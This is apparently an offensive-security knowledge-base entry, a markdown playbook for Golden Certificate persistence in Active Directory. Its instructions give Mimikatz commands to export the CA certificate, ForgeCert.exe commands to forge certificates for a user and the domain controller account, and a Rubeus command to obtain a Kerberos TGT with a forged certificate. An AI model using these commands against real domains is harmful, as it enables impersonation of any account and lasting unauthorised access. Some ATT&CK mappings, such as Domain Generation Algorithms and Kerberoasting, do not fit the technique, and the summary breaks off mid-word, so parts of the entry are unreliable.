---
id: cefc4a17-1724-4eb6-b9e3-d0d15a43aff8
name: Golden Certificate Domain Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.406454+00:00'
updated_at: '2023-04-10T20:37:30.801229+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Domain Generation Algorithms|T1483 - Domain Generation Algorithms]]'
- '[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
- '[[Group Policy Modification|T1484 - Group Policy Modification]]'
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Domain]]'
- '[[Golden Certificate]]'
- '[[Windows - Persistence]]'
commands:
- '[[Creating certificate for DC$@lab.local]]'
- '[[Creating certificate for harry@lab.local]]'
- '[[Export Certificates from Local Machine Store]]'
- '[[Request TGT with Rubeus]]'
---

# Golden Certificate Domain Persistence

## Summary

Golden Certificate Domain Persistence is a technique used by attackers to maintain access to a compromised domain by creating a trusted certificate authority and issuing certificates to their own user accounts. This method allows attackers to bypass authentication mechanisms and gain access to sens

## Description

# Description

Golden Certificate Domain Persistence is a technique used by attackers to maintain access to a compromised domain by creating a trusted certificate authority and issuing certificates to their own user accounts. This method allows attackers to bypass authentication mechanisms and gain access to sensitive resources. The attacker can forge certificates for Active Directory users and request TGTs using these certificates to obtain Kerberos tickets. This technique can be used to maintain persistence and move laterally within the network.

Technical Explanation:
An attacker can export certificates from the local machine to their own store, forge Active Directory user certificates, and request TGTs using these certificates. This allows the attacker to obtain Kerberos tickets and move laterally within the network. The attacker can also modify domain policies to ensure that their certificate is trusted by all machines in the domain. This technique can be used to maintain persistence and access sensitive resources within the network.

Business Value:
An attacker using this technique can maintain access to a compromised domain and gain access to sensitive resources. This can result in theft of intellectual property, financial loss, and reputational damage to the organization.

## Requirements

1. Access to a compromised domain

1. Authentication credentials

1. Certificate authority tools

## Defense

1. Implement strong password policies and multi-factor authentication to prevent unauthorized access to user accounts

1. Monitor domain policies for any unauthorized modifications

1. Implement certificate revocation lists to prevent the use of compromised certificates

## Objectives

1. Maintain access to a compromised domain

1. Forge certificates for Active Directory users

1. Request TGTs using forged certificates

1. Move laterally within the network

1. Access sensitive resources

# Instructions

1. To export certificates from the local machine to the 'My' store, run the following commands:

**Code**: [[privilege::debug
crypto::capi
crypto::cng
crypto::]]

> This command will export certificates from the local machine to the 'My' store. The 'privilege::debug' command enables debug privileges for the current process. 'crypto::capi', 'crypto::cng', and 'crypto::certificates' are Mimikatz commands that allow you to interact with the certificate store. '/systemstore:local_machine' specifies the system store to use, and '/store:my' specifies the personal certificate store. '/export' will export the certificates to the specified store.

**Command** ([[Export Certificates from Local Machine Store]]):

```bash
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /store:my /export
```

2. To use this tool, run the ForgeCert.exe command followed by the necessary arguments. The arguments are as follows:
--CaCertPath: The path to the CA certificate file.
--CaCertPassword: The password for the CA certificate file.
--Subject: The subject name for the new certificate.
--SubjectAltName: The subject alternative name for the new certificate.
--NewCertPath: The path where the new certificate file will be saved.
--NewCertPassword: The password for the new certificate file.

**Code**: [[ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword]]

> This tool is used to forge a certificate for any active domain user using the CA certificate. Multiple commands can be run to forge certificates for multiple users. The arguments provide the necessary details for creating the new certificate. The Subject and SubjectAltName arguments are used to specify the subject name and alternative name for the new certificate respectively. The NewCertPath argument specifies the path where the new certificate file will be saved. The NewCertPassword argument is used to set the password for the new certificate file. The CaCertPath and CaCertPassword arguments are used to specify the path and password for the CA certificate file.

**Command** ([[Creating certificate for harry@lab.local]]):

```bash
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
```

**Command** ([[Creating certificate for DC$@lab.local]]):

```bash
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
```

3. This command requests a TGT (Ticket Granting Ticket) using a certificate for authentication. The command takes the following arguments:
- /user: The user account for which to request the TGT
- /certificate: The path to the certificate file
- /password: The password for the certificate

**Code**: [[Rubeus.exe asktgt /user:ron /certificate:harry.pfx]]

> This command is useful for scenarios where a user needs to authenticate using a certificate instead of a password. The TGT obtained can be used to request service tickets for accessing network resources.

**Command** ([[Request TGT with Rubeus]]):

```bash
Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Domain Generation Algorithms|T1483 - Domain Generation Algorithms]]
- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Group Policy Modification|T1484 - Group Policy Modification]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[Creating certificate for DC$@lab.local]]
- [[Creating certificate for harry@lab.local]]
- [[Export Certificates from Local Machine Store]]
- [[Request TGT with Rubeus]]

## Tags

- [[Domain]]
- [[Golden Certificate]]
- [[Windows - Persistence]]
